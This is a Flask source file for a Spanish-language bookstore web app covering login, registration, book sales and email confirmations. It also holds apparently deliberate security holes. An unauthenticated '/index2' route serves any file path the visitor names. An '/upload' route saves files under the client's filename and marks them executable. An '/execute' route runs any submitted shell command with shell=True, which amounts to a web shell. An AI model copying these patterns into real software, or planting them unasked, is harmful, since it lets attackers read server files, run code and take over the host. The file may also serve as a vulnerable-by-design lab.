from flask import Flask, render_template, request, url_for, redirect, flash, jsonify, Response, send_from_directory
import os
import stat
from flask_mysqldb import MySQL
from flask_wtf.csrf import CSRFProtect
from flask_login import LoginManager, login_user, logout_user, login_required, current_user
from flask_mail import Mail
from werkzeug.security import check_password_hash, generate_password_hash
from .models.ModeloCompra import ModeloCompra
from .models.ModeloLibro import ModeloLibro
from .models.ModeloUsuario import ModeloUsuario
from .models.entities.Usuario import Usuario
from .models.entities.Compra import Compra
from .models.entities.Libro import Libro
from .consts import *
from .emails import confirmacion_compra, confirmacion_registro_usuario
import subprocess

app = Flask(__name__)

csrf = CSRFProtect()
db = MySQL(app)
login_manager_app = LoginManager(app)
mail = Mail()

UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'uploads')
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@login_manager_app.user_loader
def load_user(id):
    return ModeloUsuario.obtener_por_id(db, id)

@app.route("/login", methods = ['GET','POST'])
def login():
    if request.method == 'POST':
        usuario = Usuario(None, request.form['usuario'], request.form['password'], None, None, None, None, None, None, None)
        usuario_logueado = ModeloUsuario.login(db,usuario)
        if usuario_logueado != None:
            login_user(usuario_logueado)
            flash(MENSAJE_BIENVENIDA, 'success')
            return redirect(url_for('index'))
        else:
            flash(LOGIN_CREDENCIALESINVALIDAS, 'warning')
            return render_template('auth/login.html')
    else:
        return render_template('auth/login.html')

@app.route("/index2", methods=['GET', 'POST'])
def index2():
    page = request.args.get('page')
    
    if not page:
        page = 'index2.html'

    page_path = os.path.join(os.getcwd(), page)

    if not os.path.exists(page_path):
        return f"El archivo {page} no existe en el sistema", 404

    try:
        with open(page_path, 'r') as file:
            content = file.read()
        return Response(content, mimetype='text/html')
    except Exception as e:
        return f"Error al cargar el archivo: {str(e)}", 404

@app.route('/logout')
def logout():
    logout_user()
    flash(LOGOUT, 'success')
    return redirect(url_for('login'))

@app.route('/registrar', methods=['GET', 'POST'])
def registrar():
    """Funcion para que el usuario se registre"""
    if request.method == 'POST':
        usuario = request.form.get('usuario')
        password = request.form.get('password')
        hashed_password = generate_password_hash(password)
        tipousuario_id = request.form.get('tipousuario_id')
        nombre = request.form.get('nombre')
        apellido_p = request.form.get('apellidoPaterno')
        apellido_m = request.form.get('apellidoMaterno')
        direccion = request.form.get('direccion')
        correo = request.form.get('correo')
        telefono = request.form.get('telefono')

        usuario_existe = ModeloUsuario.usuario_existe(db, usuario)
        correo_existe = ModeloUsuario.correo_existe(db, correo)

        if len(usuario) < 6:
            flash('El usuario debe tener al menos seis caracteres', 'warning')
        elif len(password) < 6:
            flash('La contraseña debe tener al menos seis caracteres', 'warning')
        elif usuario_existe:
            flash('El usuario ya existe en la base de datos, ingresa otro nombre', 'warning')
        elif correo_existe:
            flash('El correo ya existe en la base de datos, ingresa otro correo', 'warning')
        else:
            # Crear instancia de la clase usuario y se mandan los parametros
            user = Usuario(None, usuario, hashed_password, tipousuario_id, nombre, apellido_p, apellido_m, direccion, correo, telefono)
            usuario_creado = ModeloUsuario.registar_usuario(db, user)

            if usuario_creado:
                print('Se creó el usuario correctamente')
                flash(USUARIO_CREADO, 'success')
                confirmacion_registro_usuario(app, mail, correo)
                return redirect(url_for('registrar'))
            else:
                flash(USUARIO_ERROR, 'success')
                print('El usuario no se creó correctamente, checa las sentencias')

    return render_template('registar.html')

@app.route("/")
@login_required
def index():
    if current_user.is_authenticated:
        if current_user.tipousuario.id == 1:
            try:
                libros_vendidos = ModeloLibro.listar_libros_vendidos(db)
                data = {
                    'titulo': 'Libros vendidos',
                    'libros_vendidos': libros_vendidos
                }
                return render_template('index.html', data=data)
            except Exception as ex:
                return render_template('errores/error.html', mensaje=format(ex))
        else:
            try:
                compras = ModeloCompra.listar_compras_usuario(db, current_user)
                data = {
                    'titulo': 'Mis compras',
                    'compras': compras
                }
                return render_template('index.html', data=data)
            except Exception as ex:
                return render_template('errores/error.html', mensaje=format(ex))
    else:
        return redirect(url_for('login'))

@app.route("/libros")
@login_required
def listar_libros():
    try:
        libros = ModeloLibro.listar_libros(db)
        data = {
            'titulo': 'Libros',
            'libros': libros
        }
        return render_template('listado_libros.html', data=data)
    except Exception as ex:
        return render_template('errores/error.html', mensaje=format(ex))

@app.route("/comprarLibro", methods=['POST'])
@login_required
def comprar_libro():
    data_request = request.get_json()
    print(f"El isbn es: {data_request}")
    data = {}
    try:
        libro = ModeloLibro.leer_libro(db, data_request['isbn'])
        compra = Compra(None, libro, current_user)
        data['exito'] = ModeloCompra.registrar_compra(db, compra)

        # confirmacion_compra(mail, current_user, libro) Envio normal
        confirmacion_compra(app, mail, current_user, libro) # Envio asincrono
    except Exception as ex:
        data['mensaje'] = format(ex)
        data['exito'] = False
    return jsonify(data)

@app.route('/upload', methods=['GET', 'POST'])
@login_required
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            return "No se ha enviado ningún archivo"
        
        file = request.files['file']
        
        if file.filename == '':
            return "No se seleccionó ningún archivo"

        if file:
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
            file.save(file_path)
            
            # Cambiar permisos para permitir ejecución
            st = os.stat(file_path)
            os.chmod(file_path, st.st_mode | stat.S_IEXEC)
            
            return f"El archivo {file.filename} ha sido subido. Ruta: {file_path}"

    return render_template('upload.html')

@app.route("/upload_form")
def upload_form():
    return render_template('upload.html')

@app.route('/uploads/<filename>')
@login_required
def uploaded_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(file_path):
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
    else:
        return f"El archivo {filename} no se encuentra en el servidor", 404

@app.route('/execute', methods=['POST'])
@login_required
def execute_command():
    command = request.form.get('command')
    if command:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return jsonify({
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    return jsonify({'error': 'No command provided'}), 400

def pagina_no_autorizada(error):
    return redirect(url_for('login'))

def inicializar_app(config):
    app.config.from_object(config)
    csrf.init_app(app)
    mail.init_app(app)
    app.register_error_handler(401, pagina_no_autorizada)
    return app
